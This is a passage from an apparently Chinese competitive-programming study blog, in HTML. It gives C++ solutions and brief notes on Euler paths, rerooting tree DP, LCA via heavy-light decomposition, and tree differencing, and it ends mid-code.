class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e3</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;G[N];</span><br><span class="line"><span class="type">int</span> vis[N][N];</span><br><span class="line"><span class="type">int</span> deg[N];</span><br><span class="line"><span class="type">int</span> fa[N];</span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="type">int</span>&gt;st;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getfa</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(fa[x]==x)<span class="keyword">return</span> x;</span><br><span class="line"><span class="keyword">return</span> fa[x] = getfa(fa[x]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">uni</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>&#123;</span><br><span class="line"><span class="type">int</span> fx = getfa(x),fy = getfa(y);</span><br><span class="line">fa[fx] = fy;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> u)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">125</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(vis[u][i])&#123;</span><br><span class="line">vis[u][i] = vis[i][u] = <span class="number">0</span>;</span><br><span class="line">dfs(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">st.push(u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">125</span>;i++)fa[i] = i;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">G[s[<span class="number">0</span>]].push_back(s[<span class="number">1</span>]);</span><br><span class="line">G[s[<span class="number">1</span>]].push_back(s[<span class="number">0</span>]);</span><br><span class="line">vis[s[<span class="number">1</span>]][s[<span class="number">0</span>]] = vis[s[<span class="number">0</span>]][s[<span class="number">1</span>]] = <span class="number">1</span>;</span><br><span class="line">deg[s[<span class="number">0</span>]]++,deg[s[<span class="number">1</span>]]++;</span><br><span class="line">uni(s[<span class="number">0</span>],s[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> root_cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">125</span>;i++)</span><br><span class="line"><span class="keyword">if</span>(deg[i]&amp;&amp;fa[i]==i)</span><br><span class="line">root_cnt++;</span><br><span class="line"><span class="keyword">if</span>(root_cnt!=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;No Solution\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">sort(G[i].begin(),G[i].end());</span><br><span class="line"><span class="type">int</span> cntj = <span class="number">0</span>,start=<span class="number">-1</span>,is_loop = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">125</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(deg[i]!=<span class="number">0</span>&amp;&amp;deg[i]%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">cntj++;</span><br><span class="line">is_loop = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(start==<span class="number">-1</span>)start = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(cntj&gt;<span class="number">0</span>&amp;&amp;cntj!=<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;No Solution\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_loop)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">125</span>;i++)</span><br><span class="line"><span class="keyword">if</span>(deg[i])&#123;</span><br><span class="line">start = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">dfs(start);</span><br><span class="line"><span class="keyword">while</span>(!st.empty())&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="type">char</span>(st.top())&lt;&lt;<span class="string">&quot;&quot;</span>;</span><br><span class="line">st.pop();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="差分约束系统"><a href="#差分约束系统" class="headerlink" title="差分约束系统"></a>差分约束系统</h2><p>虽说感觉变形变难后也套不对 但是骗分总比不会好…</p><h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><h2 id="树形DP"><a href="#树形DP" class="headerlink" title="树形DP"></a>树形DP</h2><p>主要练习一下换根DP和一些简单的DP</p><h3 id="换根DP"><a href="#换根DP" class="headerlink" title="换根DP"></a>换根DP</h3><p>以医院设置为例<br>树形DP的几个点:</p><ol><li>一般都需要一次dfs预处理dep siz fa 这些数组</li><li>DP时 注意是在DFS(v,u)之前更新<code>f[]</code>还是之后<br> (一般父亲更新儿子在之前 儿子更新父亲在之后)<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e2</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> n,a[N];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Tree</span>&#123;</span></span><br><span class="line"><span class="type">int</span> nxt,to;</span><br><span class="line">&#125;edge[N&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> head[N],cnt,tot;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> v)</span>&#123;</span><br><span class="line">cnt++;</span><br><span class="line">edge[cnt].to = v;</span><br><span class="line">edge[cnt].nxt = head[u];</span><br><span class="line">head[u] = cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> dep[N],siz[N],fa[N];</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> fat)</span>&#123;</span><br><span class="line">fa[u] = fat,dep[u] = dep[fat]+<span class="number">1</span>,siz[u] = a[u];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=head[u];i;i=edge[i].nxt)&#123;</span><br><span class="line"><span class="type">int</span> v = edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(v==fat)<span class="keyword">continue</span>;</span><br><span class="line">dfs(v,u);</span><br><span class="line">siz[u] += siz[v];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> f[N];</span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> fat)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=head[u];i;i=edge[i].nxt)&#123;</span><br><span class="line"><span class="type">int</span> v = edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(v==fat)<span class="keyword">continue</span>;</span><br><span class="line">f[v] = min(f[v],f[u]+tot<span class="number">-2</span>*siz[v]);</span><br><span class="line">DFS(v,u);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line"><span class="type">int</span> u,v;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">tot+=a[i];</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;u&gt;&gt;v;</span><br><span class="line"><span class="keyword">if</span>(u)add(i,u),add(u,i);</span><br><span class="line"><span class="keyword">if</span>(v)add(i,v),add(v,i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(f,<span class="number">0x3f</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">dfs(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">f[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)f[<span class="number">1</span>] += a[i]*(dep[i]-dep[<span class="number">1</span>]);</span><br><span class="line">DFS(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="type">int</span> minn = LONG_MAX;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)minn = min(minn,f[i]);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;minn&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="LCA"><a href="#LCA" class="headerlink" title="LCA"></a>LCA</h2><p>树链剖分版<br>借此熟悉树的相关操作 儿子节点和父节点的关系以及其对应的前向星建树<br>注意几个点:</p><ol><li>for(int i&#x3D;1;i&lt;n;i++)cin&gt;&gt;u&gt;&gt;v;</li><li>if(v&#x3D;&#x3D;fat)continue</li><li>实际上是 dfs1(root,0) dfs2(root,root)<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e4</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Graph</span>&#123;</span></span><br><span class="line"><span class="type">int</span> nxt,to;</span><br><span class="line">&#125;edge[N&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> head[N],cnt;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> v)</span>&#123;</span><br><span class="line">cnt++;</span><br><span class="line">edge[cnt].to = v;</span><br><span class="line">edge[cnt].nxt = head[u];</span><br><span class="line">head[u] = cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> dep[N],siz[N],son[N],fa[N],wid[N],maxwid,maxdep;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs1</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> fat)</span>&#123;</span><br><span class="line">dep[u] = dep[fat]+<span class="number">1</span>,fa[u] = fat,siz[u] = <span class="number">1</span>,wid[dep[u]]++;</span><br><span class="line">maxwid = max(maxwid,wid[dep[u]]);</span><br><span class="line">maxdep = max(maxdep,dep[u]);</span><br><span class="line"><span class="type">int</span> maxson = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=head[u];i;i=edge[i].nxt)&#123;</span><br><span class="line"><span class="type">int</span> v = edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(v==fat)<span class="keyword">continue</span>;</span><br><span class="line">dfs1(v,u);</span><br><span class="line">siz[u] += siz[v];</span><br><span class="line"><span class="keyword">if</span>(siz[v]&gt;maxson)maxson = siz[v],son[u] = v;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> id[N],times = <span class="number">0</span>,top[N];</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs2</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> topf)</span>&#123;</span><br><span class="line">id[u] = ++times;</span><br><span class="line">top[u] = topf;</span><br><span class="line"><span class="keyword">if</span>(!son[u])<span class="keyword">return</span> ;</span><br><span class="line">dfs2(son[u],topf);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=head[u];i;i=edge[i].nxt)&#123;</span><br><span class="line"><span class="type">int</span> v = edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(id[v])<span class="keyword">continue</span>;</span><br><span class="line">dfs2(v,v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">LCA</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(top[x]!=top[y])&#123;</span><br><span class="line"><span class="keyword">if</span>(dep[top[x]]&lt;dep[top[y]])swap(x,y);</span><br><span class="line">x = fa[top[x]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(dep[x]&gt;dep[y])swap(x,y);</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="type">int</span> u,v;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;u&gt;&gt;v;</span><br><span class="line">add(u,v);</span><br><span class="line">add(v,u);</span><br><span class="line">&#125;</span><br><span class="line">dfs1(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">dfs2(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="type">int</span> x,y;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;maxdep&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;maxwid&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="type">int</span> u = LCA(x,y);</span><br><span class="line"><span class="type">int</span> ans = <span class="number">2</span>*(dep[x]-dep[u])+(dep[y]-dep[u]);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="树上差分"><a href="#树上差分" class="headerlink" title="树上差分"></a>树上差分</h2><p>与LCA结合的题目</p><h3 id="点差分"><a href="#点差分" class="headerlink" title="点差分"></a>点差分</h3><p>统计的是节点的情况<br>处理:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int u = LCA(s,t);</span><br><span class="line">chafen[s]++,chafen[t]++;</span><br><span class="line">chafen[u]--,chafen[fa[u]]--;</span><br></pre></td></tr></table></figure><p>最后跑一遍dfs把<code>chafen[]</code>累加起来就ok</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">const int N = 5e4+4;</span><br><span class="line">const int M = 1e5+5;</span><br><span class="line">int n,m;</span><br><span class="line">struct Tree&#123;</span><br><span class="line">int nxt,to;</span><br><span class="line">&#125;edge[N&lt;&lt;1];</span><br><span class="line">int head[N],cnt;</span><br><span class="line">void add(int u,int v)&#123;</span><br><span class="line">cnt++;</span><br><span class="line">edge[cnt].to = v;</span><br><span class="line">edge[cnt].nxt = head[u];</span><br><span class="line">head[u] = cnt;</span><br><span class="line">&#125;</span><br><span class="line">int fa[N],dep[N],siz[N],son[N];</span><br><span class="line">void dfs1(int u,int fat)&#123;</span><br><span class="line">fa[u] = fat,dep[u] = dep[fat]+1,siz[u] = 1;</span><br><span class="line">int maxson = -1;</span><br><span class="line">for(int i=head[u];i;i=edge[i].nxt)&#123;</span><br><span class="line">int v = edge[i].to;</span><br><span class="line">if(v==fat)continue;</span><br><span class="line">dfs1(v,u);</span><br><span class="line">siz[u] += siz[v];</span><br><span class="line">if(siz[v]&gt;maxson)maxson = siz[v],son[u] = v;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int top[N],id[N],idx = 0;</span><br><span class="line">void dfs2(int u,int topf)&#123;</span><br><span class="line">id[u] = ++idx;</span><br><span class="line">top[u] = topf;</span><br><span class="line">if(!son[u])return ;</span><br><span class="line">dfs2(son[u],topf);</span><br><span class="line">for(int i=head[u];i;i=edge[i].nxt)&#123;</span><br><span class="line">int v = edge[i].to;</span><br><span class="line">if(id[v])continue;</span><br><span class="line">dfs2(v,v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int LCA(int x,int y)&#123;</span><br><span class="line">while(top[x]!=top[y])&#123;</span><br><span class="line">if(dep[top[x]]&lt;dep[top[y]])swap(x,y);</span><br><span class="line">x = fa[top[x]];</span><br><span class="line">&#125;</span><br><span class="line">if(dep[x]&gt;dep[y])swap(x,y);</span><br><span class="line">return x;</span><br><span class="line">&#125;</span><br><span class="line">int chafen[N];</span><br><span class="line">void dfs(int u,int fat)&#123; // to sum up  chafen[]</span><br><span class="line">for(int i=head[u];i;i=edge[i].nxt)&#123;</span><br><span class="line">int v = edge[i].to;</span><br><span class="line">if(v==fat)continue;</span><br><span class="line">dfs(v,u);</span><br><span class="line">chafen[u] += chafen[v];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">signed main()&#123;</span><br><span class="line">ios::sync_with_stdio(false);</span><br><span class="line">cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">for(int i=1;i&lt;n;i++)&#123;</span><br><span class="line">int u,v;</span><br><span class="line">cin&gt;&gt;u&gt;&gt;v;</span><br><span class="line">add(u,v);</span><br><span class="line">add(v,u);</span><br><span class="line">&#125;</span><br><span class="line">dfs1(1,0);</span><br><span class="line">dfs2(1,1);</span><br><span class="line">for(int i=1;i&lt;=m;i++)&#123;</span><br><span class="line">int s,t;</span><br><span class="line">cin&gt;&gt;s&gt;&gt;t;</span><br><span class="line">int u = LCA(s,t);</span><br><span class="line">chafen[s]++,chafen[t]++;</span><br><span class="line">chafen[u]--,chafen[fa[u]]--;</span><br><span class="line">&#125;</span><br><span class="line">dfs(1,0);</span><br><span class="line">int maxflow = -1;</span><br><span class="line">for(int i=1;i&lt;=n;i++)maxflow = max(maxflow,chafen[i]);</span><br><span class="line">cout&lt;&lt;maxflow&lt;&lt;&quot;\n&quot;;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="边差分"><a href="#边差分" class="headerlink" title="边差分"></a>边差分</h3><p>将边经过的次数问题转化为子节点<br>比如 u-&gt;v 就转化到 <code>chafen[v]</code><br>那么如果要用到<code>edge[]</code>的信息怎么找<code>u</code>对应哪条边呢?<br>我们枚举u的邻接点v 如果v&#x3D;&#x3D;fat 就把这条边<code>i</code>记录下来<br>然后累加完得到<code>chafen[u]</code> 就可以利用i这条边上存储的信息解个<code>chafen[u]</code>存储的i经过的次数来解题了<br>以 <code>P6869</code> 为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">200000</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> M = <span class="number">1e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Tree</span>&#123;</span></span><br><span class="line"><span class="type">int</span> nxt,to,w1,w2;</span><br><span class="line">&#125;edge[N&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> head[N],cnt;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> v,<span class="type">int</span> w1,<span class="type">int</span> w2)</span>&#123;</span><br><span class="line">cnt++;</span><br><span class="line">edge[cnt].to = v;</span><br><span class="line">edge[cnt].nxt = head[u];</span><br><span class="line">edge[cnt].w1 = w1;edge[cnt].w2 = w2;</span><br><span class="line">head[u] = cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> fa[N],dep[N],siz[N],son[N];</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs1</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> fat)</span>&#123;</span><br><span class="line">fa[u] = fat,dep[u] = dep[fat]+<span class="number">1</span>,siz[u] = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> maxson = <span 